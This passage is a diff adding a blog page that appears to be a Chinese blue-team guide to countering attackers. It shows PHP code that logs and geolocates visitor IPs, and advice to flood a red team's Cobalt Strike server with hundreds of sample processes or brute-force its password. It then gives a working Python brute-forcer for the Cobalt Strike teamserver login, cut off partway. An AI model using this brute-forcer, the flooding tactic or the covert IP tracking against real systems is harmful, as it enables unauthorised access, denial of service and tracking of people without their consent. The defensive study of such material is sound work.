+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
+</span></span><span class="line"><span class="cl">echo &#34;Your IP address is: $ip&#34;;
+</span></span><span class="line"><span class="cl">$ip=get_real_ip();
+</span></span><span class="line"><span class="cl">    $dat=date(&#39;Y-m-d H:i:s&#39;,time());
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        $a=$dat.&#39; &#39;.&#39;文件名称:&#39;.&#39; IP:&#39;.$ip.&#34;\n&#34;;
+</span></span><span class="line"><span class="cl">        $myfile=fopen(&#34;testfile.txt&#34;, &#34;a+&#34;);
+</span></span><span class="line"><span class="cl">        fwrite($myfile, $a);
+</span></span><span class="line"><span class="cl">        fclose($myfile);
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    function get_real_ip()
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    $ip=FALSE;
+</span></span><span class="line"><span class="cl">    //客户端IP 或 NONE
+</span></span><span class="line"><span class="cl">    if(!empty($_SERVER[&#34;HTTP_CLIENT_IP&#34;])){
+</span></span><span class="line"><span class="cl">        $ip = $_SERVER[&#34;HTTP_CLIENT_IP&#34;];
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空
+</span></span><span class="line"><span class="cl">    if (!empty($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {
+</span></span><span class="line"><span class="cl">        $ips = explode (&#34;, &#34;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);
+</span></span><span class="line"><span class="cl">        if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }
+</span></span><span class="line"><span class="cl">        for ($i = 0; $i &lt; count($ips); $i++) {
+</span></span><span class="line"><span class="cl">            if (!eregi (&#34;^(10│172.16│192.168).&#34;, $ips[$i])) {
+</span></span><span class="line"><span class="cl">                $ip = $ips[$i];
+</span></span><span class="line"><span class="cl">                break;
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    //客户端IP 或 (最后一个)代理服务器 IP
+</span></span><span class="line"><span class="cl">    return ($ip ? $ip : $_SERVER[&#39;REMOTE_ADDR&#39;]);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取攻击者访问时间、ip后会在本地生成日志文件
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616003130699.png" title="image-20230616003130699" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616003130699.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616003130699.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616003130699.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616003130699.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616003130699.png 2x"
+            sizes="auto"
+            alt="image-20230616003130699">
+    </a></figure></p>
+<h5 id="获取经纬度" class="headerLink">
+    <a href="#%e8%8e%b7%e5%8f%96%e7%bb%8f%e7%ba%ac%e5%ba%a6" class="header-mark"></a>7.0.5.3 获取经纬度：</h5><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">echo $_SERVER[&#39;HTTP_HOST&#39;];
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$getIp=$_SERVER[&#34;REMOTE_ADDR&#34;];
+</span></span><span class="line"><span class="cl">echo &#39;IP:&#39;,$getIp;
+</span></span><span class="line"><span class="cl">echo &#39;&lt;br/&gt;&#39;;
+</span></span><span class="line"><span class="cl">$content = file_get_contents(&#34;http://api.map.baidu.com/location/ip?ak=自己去申请一个&amp;ip={$getIp}&amp;coor=bd09ll&#34;);
+</span></span><span class="line"><span class="cl">$json = json_decode($content);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">echo &#39;log:&#39;,$json-&gt;{&#39;content&#39;}-&gt;{&#39;point&#39;}-&gt;{&#39;x&#39;};//按层级关系提取经度数据
+</span></span><span class="line"><span class="cl">echo &#39;&lt;br/&gt;&#39;;
+</span></span><span class="line"><span class="cl">echo &#39;lat:&#39;,$json-&gt;{&#39;content&#39;}-&gt;{&#39;point&#39;}-&gt;{&#39;y&#39;};//按层级关系提取纬度数据
+</span></span><span class="line"><span class="cl">echo &#39;&lt;br/&gt;&#39;;
+</span></span><span class="line"><span class="cl">print $json-&gt;{&#39;content&#39;}-&gt;{&#39;address&#39;};//按层级关系提取address数
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">echo $json-&gt;{&#39;content&#39;}-&gt;{&#39;address_detail&#39;}-&gt;{&#39;city_code&#39;};
+</span></span><span class="line"><span class="cl">print_r($json);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>样本逆向分析：
+大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器</p>
+<p>钓鱼邮件分析：
+PDF信息获取等</p>
+<h2 id="cobalt-strike反制" class="headerLink">
+    <a href="#cobalt-strike%e5%8f%8d%e5%88%b6" class="header-mark"></a>8 Cobalt Strike反制</h2><p>在防守里面,必不可少的是钓鱼邮件,或者社工钓鱼,一般来说钓鱼的样本无非这几种,exe elf可执行文件,以及加了料的doc类宏木马,一般而言,目前红队主要是通过cobalt strike生成相关上线的shell</p>
+<ol>
+<li>
+<p>批量上线钓鱼马,启几百个进程mddos红方的cs端.假如我们获取到了红方的cs样本,那么第一种方法可以批量启几百个进程运行该样本(注意隔离环境),然后红方的cs端几乎瘫痪,无法使用</p>
+</li>
+<li>
+<p>爆破cs密码 一般而言,红队的cs设施为了多人运动,密码通常不会太复杂,很大机会是弱口令为主,甚至teamserver端口50050,那么针对cs端控制端,可以直接进行密码爆破</p>
+</li>
+<li>
+<p>假上线,我们只需要发送心跳包,即可模拟上线,并且攻击者无法执行命令.使用时更改换IP或域名、port、cookie</p>
+</li>
+</ol>
+<p>附CS爆破密码脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ssl</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">concurrent.futures</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># csbrute.py - Cobalt Strike Team Server Password Brute Forcer</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># https://stackoverflow.com/questions/6224736/how-to-write-python-code-that-is-able-to-properly-require-a-minimal-python-versi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">MIN_PYTHON</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">version_info</span> <span class="o">&lt;</span> <span class="n">MIN_PYTHON</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="s2">&#34;Python </span><span class="si">%s</span><span class="s2">.</span><span class="si">%s</span><span class="s2"> or later is required.</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">MIN_PYTHON</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;host&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Teamserver address&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;wordlist&#34;</span><span class="p">,</span> <span class="n">nargs</span><span class="o">=</span><span class="s2">&#34;?&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Newline-delimited word list file&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;-p&#34;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&#34;port&#34;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">50050</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Teamserver port&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;-t&#34;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&#34;threads&#34;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">25</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Concurrency level&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># https://stackoverflow.com/questions/27679890/how-to-handle-ssl-connections-in-raw-python-socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">NotConnectedException</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">node</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">message</span> <span class="o">=</span> <span class="n">message</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">node</span> <span class="o">=</span> <span class="n">node</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DisconnectedException</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">node</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">message</span> <span class="o">=</span> <span class="n">message</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">node</span> <span class="o">=</span> <span class="n">node</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Connector</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">ssl_sock</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">SSLContext</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="o">.</span><span class="n">verify_mode</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">CERT_NONE</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">is_connected</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">sock</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">ssl_sock</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">open</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">ssl_sock</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">hostname</span> <span class="o">==</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostname</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ipaddress</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostbyname_ex</span><span class="p">(</span><span class="n">hostname</span><span class="p">)[</span><span class="mi">2</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">ssl_sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ipaddress</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">ssl_sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">close</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">ssl_sock</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">buffer</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">ssl_sock</span><span class="p">:</span> <span class="k">raise</span> <span class="n">NotConnectedException</span><span class="p">(</span><span class="s2">&#34;Not connected (SSL Socket is null)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">ssl_sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">receive</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">ssl_sock</span><span class="p">:</span> <span class="k">raise</span> <span class="n">NotConnectedException</span><span class="p">(</span><span class="s2">&#34;Not connected (SSL Socket is null)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">received_size</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data_buffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">received_size</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data_in</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ssl_sock</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data_buffer</span> <span class="o">=</span> <span class="n">data_buffer</span> <span class="o">+</span> <span class="n">data_in</span>
+</span></span><span class="line"><span class="cl">            <span class="n">received_size</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data_in</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">data_buffer</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">passwordcheck</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">        <span class="n">conn</span> <span class="o">=</span> <span class="n">Connector</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00\x00\xbe\xef</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;big&#34;</span><span class="p">,</span> <span class="n">signed</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">bytes</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="s2">&#34;ascii&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">conn</span><span class="o">.</span><span class="n">is_connected</span><span class="p">():</span> <span class="n">result</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">receive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">conn</span><span class="o">.</span><span class="n">is_connected</span><span class="p">():</span> <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">result</span> <span class="o">==</span> <span class="nb">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00\x00\xca\xfe</span><span class="s2">&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">password</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Ignored blank password&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">passwords</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">wordlist</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Wordlist: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">wordlist</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">passwords</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">wordlist</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Wordlist: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">&#34;stdin&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">passwords</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">rstrip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">passwords</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
